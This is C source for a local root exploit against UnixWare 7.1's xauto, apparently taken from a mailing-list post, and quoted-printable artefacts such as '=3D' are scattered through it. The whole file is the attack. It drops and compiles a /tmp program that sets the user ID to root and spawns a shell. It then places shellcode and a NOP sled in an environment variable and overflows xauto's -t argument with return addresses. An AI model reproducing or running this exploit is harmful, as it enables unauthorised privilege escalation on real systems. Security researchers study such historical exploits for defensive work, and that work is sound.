/**
 ** UnixWare 7.1 root exploit for xauto
 ** Note that xauto is NOT suid or sgid but gains it's privs from
 ** /etc/security/tcb/privs.  For more info, consult intro(2) =

 ** and fileprivs(1)
 ** =

 **
 ** Brock Tellier btellier@usa.net
 **/ =



#include <stdlib.h>
#include <stdio.h>

char scoshell[]=3D /* UnixWare 7.1 shellcode runs /tmp/ui */
"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/tmp/ui\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";

                       =

#define EGGLEN 2048
#define RETLEN 5000
#define ALIGN 0
#define NOP 0x90
#define CODE "void main() { setreuid(0,0); system(\"/bin/sh\"); }\n"

void buildui() {
  FILE *fp;
  char cc[100];

  fp =3D fopen("/tmp/ui.c", "w");
  fprintf(fp, CODE);
  fclose(fp);
  snprintf(cc, sizeof(cc), "cc -o /tmp/ui /tmp/ui.c");
  system(cc);

}

int main(int argc, char *argv[]) {
  =

  long int offset=3D0;
  =

  int i;
  int egglen =3D EGGLEN;
  int retlen;
  long int addr;
  char egg[EGGLEN];
  char ret[RETLEN];
  // who needs __asm__?  Per Solar Designer's suggestion
  unsigned long sp =3D (unsigned long)&sp; =


  buildui();
  if(argc > 3) {
    fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
    exit(0); =

  }
  else if (argc =3D=3D 2){
    offset=3Datoi(argv[1]);
    retlen=3DRETLEN;
  }
  else if (argc =3D=3D 3) {
    offset=3Datoi(argv[1]);
    retlen=3Datoi(argv[2]); =

  }
  else {
    offset=3D9400;
    retlen=3D2000;
    =

  }
  addr=3Dsp + offset;
  =

  fprintf(stderr, "UnixWare 7.x exploit for the non-su/gid
/usr/X/bin/xauto\n");
  fprintf(stderr, "Brock Tellier btellier@usa.net\n");
  fprintf(stderr, "Using offset/addr: %d/0x%x\n", offset,addr);
  =

  memset(egg,NOP,egglen);
  memcpy(egg+(egglen - strlen(scoshell) - 1),scoshell,strlen(scoshell));
  =

  for(i=3DALIGN;i< retlen-4;i+=3D4)
    *(int *)&ret[i]=3Daddr;  =

  =

  memcpy(egg, "EGG=3D", 4);
  putenv(egg);

  execl("/usr/X/bin/xauto", "xauto","-t", ret, NULL); =

  =

}
